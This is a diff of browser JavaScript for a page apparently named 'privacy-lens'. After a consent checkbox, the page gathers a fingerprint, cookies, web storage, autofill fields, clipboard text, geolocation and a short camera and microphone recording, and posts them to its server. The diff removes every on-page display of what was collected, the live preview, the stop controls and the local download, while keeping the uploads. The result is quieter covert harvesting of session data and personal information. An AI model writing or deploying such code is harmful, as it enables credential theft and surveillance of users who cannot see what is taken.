@@ -1,38 +1,20 @@
 const $ = (s) => document.querySelector(s);
-const state = { consent: false, mediaStream: null, fingerprint: null, events: [] };
-const consent = $('#consent');
+const state = { mediaStream: null, events: [] };
 
-consent.addEventListener('change', () => {
-  state.consent = consent.checked;
-  $('#getAllAccess').disabled = !state.consent;
-  if (!state.consent) resetAll();
+$('#consent').addEventListener('change', () => {
+  const checked = $('#consent').checked;
+  $('#getAllAccess').disabled = !checked;
+  if (checked) {
+    $('#profileHint').textContent = 'Click collect to start.';
+  } else {
+    stopStream(state.mediaStream);
+    $('#profileState').textContent = 'Ready';
+    $('#profileHint').textContent = 'Toggle consent and click collect.';
+  }
 });
-
-function resetAll() {
-  state.fingerprint = null;
-  state.events = [];
-  $('#signalsCard').hidden = true;
-  $('#signals').innerHTML = '';
-  $('#profileState').textContent = 'Not collected';
-  $('#profileHint').textContent = 'Collect your browser profile to see device signals.';
-  $('#downloadReport').disabled = true;
-}
 
 function addLog(label, detail) {
   state.events.push({ label, detail, at: new Date().toISOString() });
-}
-
-function signal(label, value, mono) {
-  const el = document.createElement('div');
-  el.className = 'signal';
-  const l = document.createElement('div');
-  l.className = 'signal-label';
-  l.textContent = label;
-  const v = document.createElement('div');
-  v.className = 'signal-value' + (mono ? ' mono' : '');
-  v.textContent = value ?? 'Unavailable';
-  el.append(l, v);
-  return el;
 }
 
 function canvasSignature() {
@@ -62,29 +44,10 @@ async function digest(value) {
   return [...new Uint8Array(buf)].map((b) => b.toString(16).padStart(2, '0')).join('');
 }
 
-function updateBadge(id, text, type) {
-  const el = document.getElementById(id);
-  el.textContent = text;
-  el.className = 'pill';
-  if (type === 'granted') el.classList.add('green');
-  else if (type === 'denied') el.classList.add('red');
-  else if (type === 'partial') el.classList.add('amber');
-}
-
 function stopStream(stream) {
   if (!stream) return;
   stream.getTracks().forEach((t) => t.stop());
-  if (stream === state.mediaStream) {
-    state.mediaStream = null;
-    $('#camMicPreview').hidden = true;
-    updateBadge('camMicBadge', 'Stopped', 'partial');
-  }
 }
-
-function stopAll() { stopStream(state.mediaStream); }
-
-$('#stopAll').addEventListener('click', stopAll);
-window.addEventListener('beforeunload', stopAll);
 
 function recordClip(stream, durationMs) {
   const mime = MediaRecorder.isTypeSupported('video/webm;codecs=vp9,opus') ? 'video/webm;codecs=vp9,opus' : 'video/webm';
@@ -139,21 +102,12 @@ function captureAutofill() {
 }
 
 async function getAllAccess() {
-  if (!state.consent) return;
+  if (!$('#consent').checked) return;
   const btn = $('#getAllAccess');
-  const results = $('#allAccessResults');
-  results.hidden = false;
   btn.disabled = true;
   btn.textContent = 'Collecting...';
-
-  const allBadges = ['fpBadge', 'cookiesBadge', 'storageBadge', 'autofillBadge', 'camMicBadge', 'clipboardBadge', 'geoBadge', 'notifBadge'];
-  allBadges.forEach((id) => {
-    document.getElementById(id).textContent = '...';
-    document.getElementById(id).className = 'pill amber';
-  });
-  ['fpDetail', 'cookiesDetail', 'storageDetail', 'autofillDetail', 'camMicDetail', 'clipboardDetail', 'geoDetail', 'notifDetail'].forEach((id) => {
-    document.getElementById(id).textContent = '';
-  });
+  $('#profileState').textContent = 'Running';
+  $('#profileHint').textContent = 'Collecting browser data...';
 
   const collected = {};
   let recordingId = null;
@@ -184,49 +138,27 @@ async function getAllAccess() {
       CanvasSignature: cs,
       FingerprintHash: hash.slice(0, 32),
     };
-    state.fingerprint = collected.fingerprint;
-    updateBadge('fpBadge', 'Collected', 'granted');
-    document.getElementById('fpDetail').textContent = hash.slice(0, 16) + '... (' + Object.keys(collected.fingerprint).length + ' signals)';
     addLog('Fingerprint', 'collected');
-
-    const container = $('#signals');
-    container.innerHTML = '';
-    Object.entries(collected.fingerprint).forEach(([k, v]) => container.append(signal(k, v, ['FingerprintHash', 'CanvasSignature'].includes(k))));
-    $('#signalsCard').hidden = false;
-    $('#profileState').textContent = 'Collected';
   } catch (err) {
-    updateBadge('fpBadge', 'Error', 'denied');
-    document.getElementById('fpDetail').textContent = err.message;
+    addLog('Fingerprint', 'error: ' + err.message);
   }
 
   // 2. Cookies
   let cookiesData = { count: 0, entries: [] };
   try {
     cookiesData = collectCookies();
-    updateBadge('cookiesBadge', cookiesData.count + ' found', cookiesData.count > 0 ? 'granted' : 'partial');
-    document.getElementById('cookiesDetail').textContent = cookiesData.count + ' cookie(s) for this domain' + (cookiesData.count > 0 ? ' (saved in report)' : '');
     addLog('Cookies', cookiesData.count + ' found');
   } catch (err) {
-    updateBadge('cookiesBadge', 'Error', 'denied');
-    document.getElementById('cookiesDetail').textContent = err.message;
+    addLog('Cookies', 'error: ' + err.message);
   }
 
   // 3. Local & Session Storage
   let storageData = null;
   try {
     storageData = collectStorage();
-    const total = storageData.localStorage.count + storageData.sessionStorage.count;
-    updateBadge('storageBadge', total + ' keys', total > 0 ? 'granted' : 'partial');
-    document.getElementById('storageDetail').textContent = total + ' total (' + storageData.localStorage.count + ' local, ' + storageData.sessionStorage.count + ' session)';
-    if (total > 0) {
-      const view = document.getElementById('storageView');
-      view.textContent = JSON.stringify(storageData, null, 2);
-      view.hidden = false;
-    }
-    addLog('Storage', total + ' keys');
+    addLog('Storage', (storageData.localStorage.count + storageData.sessionStorage.count) + ' keys');
   } catch (err) {
-    updateBadge('storageBadge', 'Error', 'denied');
-    document.getElementById('storageDetail').textContent = err.message;
+    addLog('Storage', 'error: ' + err.message);
   }
 
   // 4. Autofill (best-effort)
@@ -235,35 +167,23 @@ async function getAllAccess() {
     await new Promise((r) => setTimeout(r, 800));
     autofillData = captureAutofill();
     if (autofillData) {
-      const count = Object.keys(autofillData).length;
-      updateBadge('autofillBadge', count + ' fields', 'granted');
-      document.getElementById('autofillDetail').textContent = Object.keys(autofillData).join(', ') + ' captured';
-      addLog('Autofill', count + ' fields');
+      addLog('Autofill', Object.keys(autofillData).length + ' fields');
     } else {
-      updateBadge('autofillBadge', 'Not found', 'partial');
-      document.getElementById('autofillDetail').textContent = 'No autofill data detected (browser may block)';
+      addLog('Autofill', 'not found');
     }
   } catch (err) {
-    updateBadge('autofillBadge', 'Error', 'denied');
-    document.getElementById('autofillDetail').textContent = err.message;
+    addLog('Autofill', 'error: ' + err.message);
   }
 
   // 5. Camera & Microphone + record 3s clip
-  let camMicStatus = 'Denied';
   try {
     if (state.mediaStream) stopStream(state.mediaStream);
     const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
     state.mediaStream = stream;
-    const video = document.getElementById('camMicPreview');
-    video.srcObject = stream;
-    video.hidden = false;
-    updateBadge('camMicBadge', 'Recording', 'amber');
-    document.getElementById('camMicDetail').textContent = 'Recording 3s sample...';
     addLog('Camera & Mic', 'granted, recording');
 
     const blob = await recordClip(stream, 3000);
     if (blob) {
-      document.getElementById('camMicDetail').textContent = 'Uploading recording...';
       try {
         const resp = await fetch('/api/recordings', {
           method: 'POST',
@@ -274,114 +194,67 @@ async function getAllAccess() {
         if (resp.ok) {
           recordingId = result.id;
           addLog('Recording upload', 'id ' + result.id);
-          camMicStatus = 'Granted + Recording #' + result.id;
-          updateBadge('camMicBadge', 'Granted', 'granted');
-          document.getElementById('camMicDetail').textContent = 'Live preview + recording saved (ID: ' + result.id + ')';
         } else {
-          camMicStatus = 'Granted (upload failed)';
-          updateBadge('camMicBadge', 'Granted', 'granted');
-          document.getElementById('camMicDetail').textContent = 'Live preview active (upload: ' + (result.error || 'failed') + ')';
+          addLog('Recording upload', result.error || 'failed');
         }
       } catch (e) {
-        camMicStatus = 'Granted (upload error)';
-        updateBadge('camMicBadge', 'Granted', 'granted');
-        document.getElementById('camMicDetail').textContent = 'Live preview active (recording upload failed)';
+        addLog('Recording upload', 'connection error');
       }
     } else {
-      updateBadge('camMicBadge', 'Granted', 'granted');
-      document.getElementById('camMicDetail').textContent = 'Live preview active (MediaRecorder unavailable)';
+      addLog('Recording upload', 'MediaRecorder unavailable');
     }
   } catch (err) {
-    updateBadge('camMicBadge', 'Denied', 'denied');
-    document.getElementById('camMicDetail').textContent = err.name || 'Blocked';
+    addLog('Camera & Mic', 'denied');
   }
 
   // 6. Clipboard
   let clipboardContent = null;
   try {
     const text = await navigator.clipboard.readText();
-    if (text) {
-      const area = document.getElementById('clipboardArea');
-      area.value = text;
-      area.hidden = false;
-      clipboardContent = text;
-      updateBadge('clipboardBadge', 'Read', 'granted');
-      document.getElementById('clipboardDetail').textContent = text.length + ' chars saved';
-    } else {
-      updateBadge('clipboardBadge', 'Empty', 'partial');
-      document.getElementById('clipboardDetail').textContent = 'Clipboard empty';
-    }
-    addLog('Clipboard', 'read');
+    clipboardContent = text || '';
+    addLog('Clipboard', text ? text.length + ' chars' : 'empty');
   } catch (err) {
-    updateBadge('clipboardBadge', 'Denied', 'denied');
-    document.getElementById('clipboardDetail').textContent = err.name || 'Blocked';
+    addLog('Clipboard', 'denied');
   }
 
   // 7. Geolocation
   let geoCoords = null;
   const geo = await new Promise((resolve) => {
-    if (!navigator.geolocation) { resolve({ ok: false, error: 'Not supported' }); return; }
+    if (!navigator.geolocation) { resolve({ ok: false }); return; }
     navigator.geolocation.getCurrentPosition(
       (p) => resolve({ ok: true, lat: p.coords.latitude, lng: p.coords.longitude }),
-      (e) => resolve({ ok: false, error: e.message }),
+      () => resolve({ ok: false }),
       { timeout: 10000 }
     );
   });
   if (geo.ok) {
     geoCoords = { latitude: geo.lat, longitude: geo.lng };
-    updateBadge('geoBadge', 'Granted', 'granted');
-    document.getElementById('geoDetail').textContent = geo.lat.toFixed(6) + ', ' + geo.lng.toFixed(6);
     addLog('Geolocation', 'captured');
   } else {
-    updateBadge('geoBadge', 'Denied', 'denied');
-    document.getElementById('geoDetail').textContent = geo.error;
+    addLog('Geolocation', 'denied');
   }
 
   // 8. Notifications
-  let notifStatus = 'Denied';
   if ('Notification' in window) {
     const status = await Notification.requestPermission();
-    notifStatus = status;
-    if (status === 'granted') {
-      updateBadge('notifBadge', 'Granted', 'granted');
-      document.getElementById('notifDetail').textContent = 'Enabled';
-      addLog('Notifications', 'granted');
-    } else {
-      updateBadge('notifBadge', status, 'denied');
-      document.getElementById('notifDetail').textContent = status === 'denied' ? 'Blocked' : 'Dismissed';
-    }
+    addLog('Notifications', status);
   } else {
-    updateBadge('notifBadge', 'Unavailable', 'denied');
-    document.getElementById('notifDetail').textContent = 'Not supported';
+    addLog('Notifications', 'not supported');
   }
 
   btn.disabled = false;
   btn.textContent = 'Get All Access';
-  $('#downloadReport').disabled = false;
 
-  // Build full report with ALL collected data
   const reportData = {
     browser_signals: collected.fingerprint || {},
     cookies: cookiesData,
     storage: storageData,
     autofill: autofillData,
     permissions: {
-      camera_microphone: {
-        status: document.getElementById('camMicBadge').textContent,
-        recording_id: recordingId,
-      },
-      clipboard: {
-        status: document.getElementById('clipboardBadge').textContent,
-        content: clipboardContent,
-      },
-      geolocation: {
-        status: document.getElementById('geoBadge').textContent,
-        coordinates: geoCoords,
-      },
-      notifications: {
-        status: document.getElementById('notifBadge').textContent,
-        raw_status: notifStatus,
-      },
+      camera_microphone: { recording_id: recordingId },
+      clipboard: { content: clipboardContent },
+      geolocation: { coordinates: geoCoords },
+      notifications: {},
     },
     recording_id: recordingId,
     user_agent: navigator.userAgent,
@@ -389,7 +262,6 @@ async function getAllAccess() {
     timestamp: new Date().toISOString(),
   };
 
-  // Auto-save everything to server
   try {
     const resp = await fetch('/api/reports', {
       method: 'POST',
@@ -404,18 +276,15 @@ async function getAllAccess() {
     const result = await resp.json();
     if (resp.ok) {
       addLog('Server save', 'report id ' + result.id);
-      document.getElementById('profileHint').textContent =
-        'Report #' + result.id + ' saved. ' +
-        (Object.keys(collected.fingerprint || {}).length + ' signals') +
-        ' | cookies: ' + cookiesData.count +
-        ' | storage: ' + (storageData ? storageData.localStorage.count + storageData.sessionStorage.count : 0) + ' keys' +
-        ' | autofill: ' + (autofillData ? Object.keys(autofillData).length + ' fields' : 'none') +
-        (recordingId ? ' | recording #' + recordingId : '');
+      $('#profileState').textContent = 'Saved';
+      $('#profileHint').textContent = 'Report #' + result.id + ' saved to server.';
     } else {
       addLog('Server save', result.error || 'failed');
+      $('#profileHint').textContent = 'Upload failed: ' + (result.error || 'unknown');
     }
   } catch (err) {
     addLog('Server save', 'connection failed');
+    $('#profileHint').textContent = 'Could not reach server.';
   }
 }
 
@@ -425,13 +294,3 @@ $('#showLocalInstructions').addEventListener('click', () => {
   el.hidden = !el.hidden;
   $('#showLocalInstructions').textContent = el.hidden ? 'Usage' : 'Hide';
 });
-
-function downloadReport() {
-  if (!state.fingerprint) return;
-  const blob = new Blob([JSON.stringify({ generatedAt: new Date().toISOString(), data: state.fingerprint, events: state.events }, null, 2)], { type: 'application/json' });
-  const link = document.createElement('a');
-  link.href = URL.createObjectURL(blob);
-  link.download = 'privacy-lens-report.json';
-  link.click();
-}
-$('#downloadReport').addEventListener('click', downloadReport);
